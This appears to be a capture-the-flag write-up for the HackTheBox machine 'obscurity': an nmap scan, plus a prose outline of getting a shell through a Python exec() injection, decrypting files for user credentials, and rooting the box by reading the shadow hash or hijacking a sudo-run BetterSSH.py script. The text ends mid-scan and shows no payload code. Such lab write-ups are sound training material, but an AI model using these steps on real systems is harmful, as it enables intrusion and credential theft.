<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Fuzzing the hidden dir and then analyzing the python script to excute the command and get an initial shell,And after decrypting the key using superSecureCrypt.py we can get password of user robert robert can run Betterssh.py i mentioned both unintended and Two intended ways to get root." /><meta property="og:title" content="Hackthebox obscurity writeup" /><meta property="og:description" content="Fuzzing the hidden dir and then analyzing the python script to excute the command and get an initial shell,And after decrypting the key using superSecureCrypt.py we can get password of user robert robert can run Betterssh.py i mentioned both unintended and Two intended ways to get root." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/obscurity/obscurity.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox obscurity writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Fuzzing the hidden dir and then analyzing the python script to excute the command and get an initial shell,And after decrypting the key using superSecureCrypt.py we can get password of user robert robert can run Betterssh.py i mentioned both unintended and Two intended ways to get root."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/obscurity/obscurity.png"><title>Hackthebox obscurity writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox obscurity writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox obscurity writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, May 9, 2020, 12:00 AM +0800" > May 9 <i class="unloaded">2020-05-09T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/obscurity/obscurity.png" class="post-preview-img"><h1 id="informationobscurity">information@obscurity:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>obscurity<tr><td>IP<td>10.10.10.168<tr><td>Points<td>30<tr><td>Os<td>Linux<tr><td>Difficulty<td>Medium<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/83743" target="_blank">clubby789</a><tr><td>Out On<td>30 NOV 2019<tr><td>Retired on<td>9 MAY 2020</table></div><h1 id="briefobscurity">Brief@obscurity:~$</h1><p>The real Journey of <code class="language-plaintext highlighter-rouge">obscurity</code> Starts with a <strong>wfuzz</strong> on the http port <strong>8080</strong> by the file <code class="language-plaintext highlighter-rouge">SupersecureServer.py</code>.And got the <strong>exact</strong> file,Reading the file and analyzing the <strong>python</strong> code we will get a <strong>www-data</strong> shell.There are bunch of files in the dir <code class="language-plaintext highlighter-rouge">/home/robert/</code> and using the <code class="language-plaintext highlighter-rouge">SuperSecureCrypt.py</code> decrypt the <code class="language-plaintext highlighter-rouge">key</code> for the file <code class="language-plaintext highlighter-rouge">out.txt</code> and using the key <code class="language-plaintext highlighter-rouge">decrypting</code> the <code class="language-plaintext highlighter-rouge">passwordreminder.txt</code> and we got one more key that is <code class="language-plaintext highlighter-rouge">credentials</code> for user <code class="language-plaintext highlighter-rouge">robert</code>.There are <strong>Three</strong> methods to get <code class="language-plaintext highlighter-rouge">root</code> one is intended and another one is unintened , Both are related to that <code class="language-plaintext highlighter-rouge">BetterSSH.py</code> In <strong>unintended</strong> way we just remove/rename the <code class="language-plaintext highlighter-rouge">BetterSSH</code> dir and then make your own custom dir and place a file called <code class="language-plaintext highlighter-rouge">BetterSSH.py</code> containg code to <code class="language-plaintext highlighter-rouge">spawn</code> a <strong>bash shell</strong> and run the script.The <code class="language-plaintext highlighter-rouge">intended</code> way is to executing the <code class="language-plaintext highlighter-rouge">original</code> python script as root which is copying the <code class="language-plaintext highlighter-rouge">shadow</code> file and after getting hash of user <code class="language-plaintext highlighter-rouge">root</code> , crack it with <code class="language-plaintext highlighter-rouge">john</code> and we have root user <code class="language-plaintext highlighter-rouge">pass</code>.And there is one more intended maethod if your authenticate yourself while running the <strong>Python-Script</strong> and then you can run commands as <code class="language-plaintext highlighter-rouge">root</code>.</p><h1 id="summaryobscurity">Summary@obscurity:~$</h1><ul><li><code class="language-plaintext highlighter-rouge">Wfuzz</code> show a hidden dir called <code class="language-plaintext highlighter-rouge">develop</code><li>Analyzing the <code class="language-plaintext highlighter-rouge">python</code> script that is using <strong>exec()</strong><li>Crafting a <strong>payload</strong> and making a python script to <code class="language-plaintext highlighter-rouge">execute</code> the payload<li>Run the <code class="language-plaintext highlighter-rouge">python</code> script and got <strong>shell</strong> as <code class="language-plaintext highlighter-rouge">www-data</code><li>Decrypting the <code class="language-plaintext highlighter-rouge">out.txt</code> using key as <code class="language-plaintext highlighter-rouge">check.txt</code><li>Decrypting the <code class="language-plaintext highlighter-rouge">passwordreminder.txt</code> using the <strong>output</strong> we got<li>Login as <strong>robert</strong><li>Got <code class="language-plaintext highlighter-rouge">user.txt</code><li>the user <strong>robert</strong> can run <code class="language-plaintext highlighter-rouge">BetterSSH.py</code> as root<li>All used three methods are mentioned below<li>1.Method <code class="language-plaintext highlighter-rouge">Authorize</code> yourself in the <code class="language-plaintext highlighter-rouge">BetterSSH.py</code>.<li>Now you can run commnads as <strong>root</strong><li>2.Method <code class="language-plaintext highlighter-rouge">Run</code> an infinite loop in to read every file in <code class="language-plaintext highlighter-rouge">/tmp/SSH</code><li>Run the <code class="language-plaintext highlighter-rouge">BetterSSH.py</code> and grab the hash of rot user<li>3.Method Rename the <code class="language-plaintext highlighter-rouge">BetterSSH</code> to something else and make your own <code class="language-plaintext highlighter-rouge">BetterSSH</code> dir<li>Make a file called <code class="language-plaintext highlighter-rouge">BetterSSH.py</code> in it containing the code to spawn a <strong>bash</strong><li>Got root.txt</ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/obscurity/obscurity.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
</pre><td class="rouge-code"><pre>➜  obscurity nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-p-</span> obscurity.htb <span class="nt">-oA</span> scans nmap.full <span class="nt">-v</span>
Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-05-09 04:44 EDT
NSE: Loaded 148 scripts <span class="k">for </span>scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:44
Completed NSE at 04:44, 0.00s elapsed
Initiating NSE at 04:44
Completed NSE at 04:44, 0.00s elapsed
Failed to resolve <span class="s2">"nmap.full"</span><span class="nb">.</span>
Initiating Ping Scan at 04:44
Scanning obscurity.htb <span class="o">(</span>10.10.10.168<span class="o">)</span> <span class="o">[</span>4 ports]
Completed Ping Scan at 04:44, 0.40s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Failed to resolve <span class="s2">"nmap.full"</span><span class="nb">.</span>
Initiating SYN Stealth Scan at 04:44
Scanning obscurity.htb <span class="o">(</span>10.10.10.168<span class="o">)</span> <span class="o">[</span>65535 ports]
Discovered open port 22/tcp on 10.10.10.168
Discovered open port 8080/tcp on 10.10.10.168
SYN Stealth Scan Timing: About 3.80% <span class="k">done</span><span class="p">;</span> ETC: 04:58 <span class="o">(</span>0:13:05 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 12.52% <span class="k">done</span><span class="p">;</span> ETC: 04:52 <span class="o">(</span>0:07:06 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 24.42% <span class="k">done</span><span class="p">;</span> ETC: 04:50 <span class="o">(</span>0:04:42 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 34.67% <span class="k">done</span><span class="p">;</span> ETC: 04:50 <span class="o">(</span>0:03:48 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 44.90% <span class="k">done</span><span class="p">;</span> ETC: 04:50 <span class="o">(</span>0:03:05 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 55.00% <span class="k">done</span><span class="p">;</span> ETC: 04:50 <span class="o">(</span>0:02:28 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 65.73% <span class="k">done</span><span class="p">;</span> ETC: 04:49 <span class="o">(</span>0:01:50 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 75.65% <span class="k">done</span><span class="p">;</span> ETC: 04:49 <span class="o">(</span>0:01:18 remaining<span class="o">)</span>
SYN Stealth Scan Timing: About 88.22% <span class="k">done</span><span class="p">;</span> ETC: 04:49 <span class="o">(</span>0:00:36 remaining<span class="o">)</span>
Completed SYN Stealth Scan at 04:49, 295.81s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Initiating Service scan at 04:49
Scanning 2 services on obscurity.htb <span class="o">(</span>10.10.10.168<span class="o">)</span>
Completed Service scan at 04:49, 25.66s elapsed <span class="o">(</span>2 services on 1 host<span class="o">)</span>
NSE: Script scanning 10.10.10.168.
Initiating NSE at 04:49
Completed NSE at 04:50, 9.09s elapsed
Initiating NSE at 04:50
Completed NSE at 04:50, 0.00s elapsed
Nmap scan report <span class="k">for </span>obscurity.htb <span class="o">(</span>10.10.10.168<span class="o">)</span>
Host is up <span class="o">(</span>0.31s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65531 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b <span class="o">(</span>RSA<span class="o">)</span>
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 09 May 2020 03:51:23
|     Server: BadHTTPServer
|     Last-Modified: Sat, 09 May 2020 03:51:23
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
|     &lt;title&gt;0bscura&lt;/title&gt;
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=Edge"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"keywords"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
|     &lt;<span class="o">!</span><span class="nt">--</span> 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     &lt;<span class="o">!</span><span class="nt">--</span> stylesheet css <span class="nt">--</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/bootstrap.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/font-awesome.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/templatemo-blue.css"</span><span class="o">&gt;</span>
|     &lt;/head&gt;
|     &lt;body data-spy<span class="o">=</span><span class="s2">"scroll"</span> data-target<span class="o">=</span><span class="s2">".navbar-collapse"</span><span class="o">&gt;</span>
|     &lt;<span class="o">!</span><span class="nt">--</span> preloader section <span class="nt">--</span><span class="o">&gt;</span>
|     &lt;<span class="o">!</span><span class="nt">--</span>
|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"preloader"</span><span class="o">&gt;</span>
|_    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"sk-spinner sk-spinner-wordpress"</span><span class="o">&gt;</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V<span class="o">=</span>7.70%I<span class="o">=</span>7%D<span class="o">=</span>5/9%Time<span class="o">=</span>5EB66EA0%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Get
SF:Request,10FC,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Sat,</span><span class="se">\x</span><span class="s2">2009</span><span class="se">\x</span><span class="s2">20May</span><span class="se">\x</span><span class="s2">20202
SF:0</span><span class="se">\x</span><span class="s2">2003:51:23</span><span class="se">\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20BadHTTPServer</span><span class="se">\n</span><span class="s2">Last-Modified:</span><span class="se">\x</span><span class="s2">20Sat,</span><span class="se">\x</span><span class="s2">2009</span><span class="se">\x</span><span class="s2">
SF:20May</span><span class="se">\x</span><span class="s2">202020</span><span class="se">\x</span><span class="s2">2003:51:23</span><span class="se">\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">204171</span><span class="se">\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20te
SF:xt/html</span><span class="se">\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Closed</span><span class="se">\n\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">e
SF:n</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;title&gt;0bscura&lt;/title&gt;</span><span class="se">\n</span><span class="s2">
SF:</span><span class="se">\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">X-UA-Compatible</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">IE=Edge</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;m
SF:eta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=device-width,</span><span class="se">\x</span><span class="s2">20initial-sc
SF:ale=1</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">keywords</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20nam
SF:e=</span><span class="se">\"</span><span class="s2">description</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20</span><span class="se">\n</span><span class="s2">Easy</span><span class="se">\x</span><span class="s2">20Profile</span><span class="se">\x</span><span class="s2">20Templa
SF:te</span><span class="se">\n</span><span class="s2">http://www</span><span class="se">\.</span><span class="s2">templatemo</span><span class="se">\.</span><span class="s2">com/tm-467-easy-profile</span><span class="se">\n</span><span class="s2">--&gt;</span><span class="se">\n\t</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20sty
SF:lesheet</span><span class="se">\x</span><span class="s2">20css</span><span class="se">\x</span><span class="s2">20--&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/boot
SF:strap</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/font-aw
SF:esome</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/templat
SF:emo-blue</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;/head&gt;</span><span class="se">\n</span><span class="s2">&lt;body</span><span class="se">\x</span><span class="s2">20data-spy=</span><span class="se">\"</span><span class="s2">scroll</span><span class="se">\"\x</span><span class="s2">20data-target=
SF:</span><span class="se">\"\.</span><span class="s2">navbar-collapse</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\n</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20preloader</span><span class="se">\x</span><span class="s2">20section</span><span class="se">\x</span><span class="s2">20--&gt;</span><span class="se">\n</span><span class="s2">&lt;!--</span><span class="se">\n</span><span class="s2">&lt;d
SF:iv</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">preloader</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;div</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">sk-spinner</span><span class="se">\x</span><span class="s2">20sk-spinner-
SF:wordpress</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,10FC,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20S
SF:at,</span><span class="se">\x</span><span class="s2">2009</span><span class="se">\x</span><span class="s2">20May</span><span class="se">\x</span><span class="s2">202020</span><span class="se">\x</span><span class="s2">2003:51:23</span><span class="se">\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20BadHTTPServer</span><span class="se">\n</span><span class="s2">Last-Mo
SF:dified:</span><span class="se">\x</span><span class="s2">20Sat,</span><span class="se">\x</span><span class="s2">2009</span><span class="se">\x</span><span class="s2">20May</span><span class="se">\x</span><span class="s2">202020</span><span class="se">\x</span><span class="s2">2003:51:23</span><span class="se">\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2041
SF:71</span><span class="se">\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html</span><span class="se">\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Closed</span><span class="se">\n\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20h
SF:tml&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;
SF:title&gt;0bscura&lt;/title&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">X-UA-Compatible</span><span class="se">\"\x</span><span class="s2">20con
SF:tent=</span><span class="se">\"</span><span class="s2">IE=Edge</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=devi
SF:ce-width,</span><span class="se">\x</span><span class="s2">20initial-scale=1</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">keywords</span><span class="se">\"\x</span><span class="s2">20conten
SF:t=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">description</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20</span><span class="se">\n</span><span class="s2">Ea
SF:sy</span><span class="se">\x</span><span class="s2">20Profile</span><span class="se">\x</span><span class="s2">20Template</span><span class="se">\n</span><span class="s2">http://www</span><span class="se">\.</span><span class="s2">templatemo</span><span class="se">\.</span><span class="s2">com/tm-467-easy-prof
